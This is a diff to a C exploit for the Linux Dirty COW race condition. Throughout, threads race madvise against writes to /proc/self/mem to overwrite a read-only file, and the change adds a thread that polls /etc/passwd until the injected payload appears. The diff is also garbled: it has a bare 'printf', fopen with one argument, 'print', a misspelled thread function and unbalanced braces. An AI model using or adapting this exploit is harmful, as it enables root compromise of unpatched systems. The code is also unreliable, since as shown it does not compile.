@@ -34,6 +34,7 @@
 
 #define VIRTUAL_MEMORY "/proc/self/mem"
 #define THREAD_ITERATIONS 10000
+int stop = 0;
 
 typedef struct payload_info {
 	char *string;
@@ -51,16 +52,14 @@ void *writer_thread(void *arg) {
 
 	int fd = open(VIRTUAL_MEMORY, O_RDWR);
 	ERR_IF(fd < 0);
-
-	for (int i = 0; i < THREAD_ITERATIONS; i++) {
-		if (info->append) {
-			lseek(fd, (uintptr_t) info->loc_in_mem, SEEK_END);
-		} else {
+	
+	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
 			lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
 		}
 
 		write(fd, str, strlen(str));
 	}
+	printf("write finished");
 
 	return NULL;
 }
@@ -69,9 +68,33 @@ void *writer_thread(void *arg) {
 void *madviser_thread(void *arg) {
 	PayloadInfo *info = arg;
 
-	for (int i = 0; i < THREAD_ITERATIONS; i++) {
+	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
+	printf
+	return NULL;
+}
+
+void *waitForWrite(void *arg) {
+	PayloadInfo *info = arg;
+	int len = strlen(info->string);
+	char buf[len];
+
+	for(;;) {
+		FILE *fp = fopen("/etc/passwd");
+		fseek(fp, info->offset, SEEK_SET);
+		fread(buf, len, 1, fp);
+
+		if(memcmp(buf, info->string, len) == 0) {
+			print("Target file is overwritten\n");
+			break;
+		}
+
+		fclose(fp);
+		sleep(1);
+	}
+	stop = 1;
+	printf("Stop set to 1\n"); 
 
 	return NULL;
 }
@@ -163,6 +186,11 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 	info.target_fd = open(argv[argc-1], O_RDONLY);
 	ERR_IF(info.target_fd < 0);
 
+	if(info.append) {
+		info.offset = lseek(info.target_fd, 0, SEEK_END);
+		lseek(info.target_fd, 0, SEEK_SET);
+	}
+
 	return info;
 }
 
@@ -174,17 +202,23 @@ int main(int argc, char *argv[]) {
 
 	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);
 
-	pthread_t thread_1, thread_2;
+	pthread_t thread_1, thread_2, thread_3;
 
 	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
 	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
+	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, waitFroWrite, &info));
 
 	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
 	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
+	ERR_IF_PTHREAD(pthread_join(thread_3, NULL));
 
 	close(info.input_fd);
 	close(info.target_fd);
-	free(info.string);
+
+	// if memory allocated for storing payload from an input file, then free
+	if(info.input_fd != STDIN_FILENO) {
+		free(info.string);
+	}
 
 	return EXIT_SUCCESS;
 }
